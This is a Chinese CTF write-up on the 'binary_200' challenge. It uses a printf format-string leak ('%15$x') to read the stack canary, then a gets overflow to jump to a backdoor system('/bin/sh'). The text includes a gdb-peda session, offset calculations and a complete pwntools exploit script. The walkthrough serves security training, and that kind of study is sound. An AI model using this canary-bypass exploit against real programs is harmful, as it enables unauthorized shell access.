> 题目来源自：[https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61)
>
> 参考资料：[http://www.xiyblogs.cn/2020/02/24/%E7%9C%8B%E6%88%91%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E7%BB%95canary%EF%BC%8C%E6%8B%BFshell/](http://www.xiyblogs.cn/2020/02/24/%E7%9C%8B%E6%88%91%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E7%BB%95canary%EF%BC%8C%E6%8B%BFshell/)
>
> 附件下载：
>
> 链接：[https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg](https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg)
>
> 提取码：4egx
>

将文件下载下来之后，检查一下文件的保护机制：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597475673282-068f68b6-b2b1-481a-8e4c-af6aca0917ae.png)

可以知道，这是一个32位的文件，开启了NX和Canary保护。

> Canary简介：Canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上（最低位都是\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致Canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序。
>
> 所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。
>

---

> Canary绕过方式一般canary有两种利用方式：
>
> 1.爆破canary
>
> 2.如果存在字符串格式化漏洞可以输出canary并利用溢出覆盖canary从而达到绕过
>
> 这里我们采用第二种利用方法：<font style="background-color:transparent;">printf 属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。</font>
>



---

将文件扔到IDA中，看一下main函数开头的汇编：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597476129050-b90b96df-c37f-45e0-9aa3-c3d8965f5b96.png)

在看一下结尾：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597476159130-16c34bf0-fa94-464d-8df0-aa5bdfe18634.png)

上面的汇编也证实了程序开启了Canary保护，不着急，看一下main函数的伪代码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597475926147-bb15584c-0b56-42fa-ba7e-65c0b59ae14b.png)

发现可以利用的漏洞：printf（格式化字符串漏洞）和易导致栈溢出的函数gets

同时发现了后门函数 system("/bin/sh");如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597476376337-dd4dd51c-2e25-4173-bcbb-4fe297e4df97.png)

这样我们就有了一个大概的思路：**先覆盖至canary处，填上canary的值，然后覆盖至canary_protect_me处，拿到shell。**

Ok，有了思路我们开始一步一步往下走，可以利用格式化字符串漏洞泄露出canary的值。

首先，在printf函数（0x080485D3）处下断点，看字符串在堆栈中的位置，输入aaaa，详细信息如下：

```powershell
root@kali:~/桌面/CTF# gdb binary_200
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from binary_200...done.
gdb-peda$ b *0x080485D3
Breakpoint 1 at 0x80485d3: file stackguard.c, line 16.
gdb-peda$ run
Starting program: /root/桌面/CTF/binary_200 
aaaa

[----------------------------------registers-----------------------------------]
EAX: 0xffffd244 ("aaaa")
EBX: 0x0 
ECX: 0xf7fac5c0 --> 0xfbad2288 
EDX: 0xf7fad89c --> 0x0 
ESI: 0xf7fac000 --> 0x1d9d6c 
EDI: 0xf7fac000 --> 0x1d9d6c 
EBP: 0xffffd278 --> 0x0 
ESP: 0xffffd230 --> 0xffffd244 ("aaaa")
EIP: 0x80485d3 (<main+114>:	call   0x80483e0 <printf@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485c7 <main+102>:	call   0x80483f0 <gets@plt>
   0x80485cc <main+107>:	lea    eax,[esp+0x14]
   0x80485d0 <main+111>:	mov    DWORD PTR [esp],eax
=> 0x80485d3 <main+114>:	call   0x80483e0 <printf@plt>
   0x80485d8 <main+119>:	lea    eax,[esp+0x14]
   0x80485dc <main+123>:	mov    DWORD PTR [esp],eax
   0x80485df <main+126>:	call   0x80483f0 <gets@plt>
   0x80485e4 <main+131>:	mov    eax,0x0
Guessed arguments:
arg[0]: 0xffffd244 ("aaaa")
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 --> 0xffffd244 ("aaaa")
0004| 0xffffd234 --> 0x0 
0008| 0xffffd238 --> 0x1 
0012| 0xffffd23c --> 0x0 
0016| 0xffffd240 --> 0xf7fac3fc --> 0xf7fad200 --> 0x0 
0020| 0xffffd244 ("aaaa")
0024| 0xffffd248 --> 0x804a000 --> 0x8049f14 --> 0x1 
0028| 0xffffd24c --> 0x8048652 (<__libc_csu_init+82>:	add    edi,0x1)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485d3 in main () at stackguard.c:16
16	stackguard.c: 没有那个文件或目录.
gdb-peda$ 

```

然后我们尝试打印该地址的内存

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597476749416-500b1d75-0a27-4b9e-a8eb-b303fe1a9495.png),确定字符串的偏移量为5，如下图所示

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597476902141-55f14fe1-3f5f-4c61-ba3f-1cc7bf4c0a3f.png)

接下来我们在 xor 处下断点，确定Canary的偏移，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477014084-6e8258dd-8c52-41e6-985b-6515f382c72c.png)

结合一下汇编：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477166630-7f8cf4d4-92be-41b1-a25e-46f306ee5982.png)

我们可以轻易的得到寄存器edx（esp+3Ch）里存放的就是Canary的值：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477246695-83c3f076-0f07-4039-9884-eb69b18e4c48.png)

看一下Canary的偏移：（利用上面的图就行）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477340870-07bb908a-3ec9-459e-bc9d-ddbe44e528df.png)

Canary的偏移为15，这样我们在第一次gets时发送`%15$x`就会（printf）泄露出canary的值

> %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477525631-efe99688-bd74-48f3-b9d4-a6d57f5ff2ce.png)

然后我们开始确定第一次gets到canary的偏移，之前我们说过[esp+0x3c]即v5处存放Canary的随机参数，在IDA中我们分别进入v5和第一个&s,发现其偏移40

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597477868665-5a542102-43e2-462e-b14c-5e4a9616e42f.png)

然后确定Canary到EBP的偏移；我们仍然在xor处下断点（借用上面的图）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597478181863-150dd876-4ba4-4cfc-8408-0337d1d43f8f.png)

图中已经有了ESP,EBP的地址，所以我们可以算出v5 = [ESP+0x3c] = FFFFD26C ,v5的偏移量=EBP-v5，结果为12

OK，接下来开始写脚本

> v5处存放Canary，Canary是一个随机值
>

```python
from pwn import *
p = process('./binary_200')
system_addr = 0x0804854d
p.sendline('%15$x')
Canary = int(p.recv(),16)
print hex(Canary)
payload = 'A'*40 + p32(Canary) + 'A'*12 + p32(system_addr)
print hex(len(payload))
print payload
p.sendline(payload)
p.interactive()
```

> payload解释：payload = 'A'*40 + p32(Canary) + 'A'*12 + p32(system_addr)
>
> 通过第一次gets，向栈中填充40个A字符，然后覆盖我们所得到的Canary，再通过第二次gets输入12个A字符发生栈溢出，将main函数的返回地址覆盖为system_addr，从而getshell
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597479906401-b97eef01-53f5-407e-82e9-52ff03f27b92.png)

> 从上图可以看出，Canary的值是变化的
>

getshell!

